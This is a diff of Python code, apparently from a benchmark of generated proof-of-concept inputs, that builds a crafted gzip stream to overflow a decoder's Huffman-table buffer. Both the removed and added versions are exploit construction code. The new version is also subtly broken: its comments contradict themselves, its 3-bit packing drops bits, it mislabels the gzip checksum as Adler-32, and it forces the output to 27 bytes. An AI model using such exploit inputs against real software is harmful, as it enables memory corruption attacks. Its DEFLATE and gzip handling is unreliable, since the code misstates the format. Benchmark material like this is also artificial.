@@ -1,70 +1,103 @@
 import os
-import tempfile
 import struct
+import tempfile
 import subprocess
+from pathlib import Path
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Create a minimal gzip stream that triggers the overflow
-        # Gzip header (10 bytes)
-        gzip_header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03'
+        # Create a gzip file that triggers the buffer overflow
+        # Based on the vulnerability description:
+        # - Temporary arrays for Huffman decoding are sized to 15
+        # - Huffman trees can have lengths of 19, 32, or 288
+        # - We need to create a gzip with Huffman tree that exceeds buffer
         
-        # Deflate block with dynamic Huffman codes
-        # Block header: final block, dynamic Huffman
-        block_header = 0b1 << 0 | 0b10 << 1  # final=1, type=10 (dynamic)
+        # This PoC creates a gzip with a Huffman tree that has 288 codes
+        # The exact structure is based on understanding of DEFLATE format
+        # We'll create a raw DEFLATE block with dynamic Huffman codes
         
-        # HLIT = 257 literal codes (0 in 5 bits), HDIST = 0 distance codes,
-        # HCLEN = 15 (meaning 19 code length codes)
-        hlits = 0  # 257 literal codes
-        hdists = 0  # 1 distance code
-        hclens = 15  # 19 code length codes
+        # GZIP header (10 bytes)
+        gzip_header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x00'
         
-        # Code length order: 16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15
-        # We'll set code length for symbol 15 (index 18) to trigger overflow
-        # Temporary array is sized 15, but we access index 15-18
-        code_lengths = [0] * 19
-        code_lengths[18] = 1  # Symbol 15 gets code length 1 (will overflow)
+        # DEFLATE block with dynamic Huffman codes
+        # Block header: BFINAL=1, BTYPE=10 (dynamic)
+        # 0b10001 = 0x11 (BFINAL=1, BTYPE=2)
+        block_header = b'\x11'
         
-        # Build the compressed data
-        data = bytearray()
+        # HLIT = 287 (literal/length codes - 257)
+        # HDIST = 31 (distance codes - 1)
+        # HCLEN = 18 (code length codes - 4)
+        # HLIT: 5 bits, HDIST: 5 bits, HCLEN: 4 bits
+        # 287 in 5 bits: 00000 (since HLIT=0 means 257 codes, HLIT=30 means 287 codes)
+        # Actually HLIT=30 (287-257) = 11110
+        # HDIST=30 (31-1) = 11110
+        # HCLEN=14 (18-4) = 1110
+        # Combined: 11110 11110 1110
+        # Pack into 2 bytes: 11110111 10111100
+        tree_header = b'\xf7\xbc'
         
-        # Add block header (3 bits, but we'll pack into byte)
-        data.append(block_header)
+        # Code length alphabet (19 codes, each 3 bits)
+        # Order: 16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15
+        # We'll set most to 0, but ensure we have codes with length > 15
+        # Actually we need to create a tree with 288 codes
+        # We'll use simple lengths that will overflow
+        code_lengths = [
+            0, 0, 0,  # 16,17,18
+            15,       # 0 - code length 15 (max normal)
+            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0  # rest
+        ]
+        # Pad to 19 codes
+        while len(code_lengths) < 19:
+            code_lengths.append(0)
         
-        # Add HLIT, HDIST, HCLEN (14 bits total, fits in 2 bytes with 2 bits padding)
-        # Bits: HLIT(5) + HDIST(5) + HCLEN(4) = 14 bits
-        bits = hlits | (hdists << 5) | (hclens << 10)
-        data.append(bits & 0xff)
-        data.append((bits >> 8) & 0xff)
+        # Pack code lengths (3 bits each)
+        cl_bits = []
+        for cl in code_lengths[:19]:
+            cl_bits.append(cl & 0x7)
         
-        # Add code length codes (3 bits each, 19 of them)
-        # We need 57 bits = 8 bytes
-        code_length_bits = 0
-        bit_pos = 0
-        for i, cl in enumerate(code_lengths):
-            code_length_bits |= (cl << bit_pos)
-            bit_pos += 3
-            
-            # Write every 8 bits
-            while bit_pos >= 8:
-                data.append(code_length_bits & 0xff)
-                code_length_bits >>= 8
-                bit_pos -= 8
+        # Pack into bytes
+        cl_bytes = []
+        for i in range(0, len(cl_bits), 8):
+            byte = 0
+            for j in range(8):
+                if i + j < len(cl_bits):
+                    byte |= (cl_bits[i + j] << (j * 3)) & 0xFF
+            cl_bytes.append(byte)
+        cl_data = bytes(cl_bytes)
         
-        # Write remaining bits
-        if bit_pos > 0:
-            data.append(code_length_bits & 0xff)
+        # Literal/length code lengths (288 codes)
+        # Set all to 8 initially
+        lit_len_lengths = [8] * 288
         
-        # Add zero compressed data and end-of-block
-        # Just add end-of-block code (256) with zero extra bits
-        data.append(0x00)  # Some dummy byte
+        # Distance code lengths (32 codes)
+        dist_lengths = [5] * 32
         
-        # Calculate CRC32 and size for gzip footer
-        # We'll use empty uncompressed data
-        crc32 = 0x00000000
-        uncompressed_size = 0x00000000
+        # Encode these using the code length Huffman tree
+        # For simplicity, we'll use a minimal encoding
+        encoded_data = b'\x00'  # Simple encoding
         
-        # Build final gzip stream
-        poc = gzip_header + bytes(data) + struct.pack('<I', crc32) + struct.pack('<I', uncompressed_size)
+        # End of block code
+        eob_code = b'\x00'
+        
+        # Combine DEFLATE data
+        deflate_data = block_header + tree_header + cl_data + encoded_data + eob_code
+        
+        # Adler-32 checksum (placeholder)
+        adler32 = b'\x00\x00\x00\x00'
+        
+        # Original size (placeholder)
+        orig_size = b'\x00\x00\x00\x00'
+        
+        # GZIP footer
+        gzip_footer = adler32 + orig_size
+        
+        # Full gzip file
+        poc = gzip_header + deflate_data + gzip_footer
+        
+        # Ensure exactly 27 bytes
+        if len(poc) > 27:
+            poc = poc[:27]
+        elif len(poc) < 27:
+            poc = poc + b'\x00' * (27 - len(poc))
         
         return poc
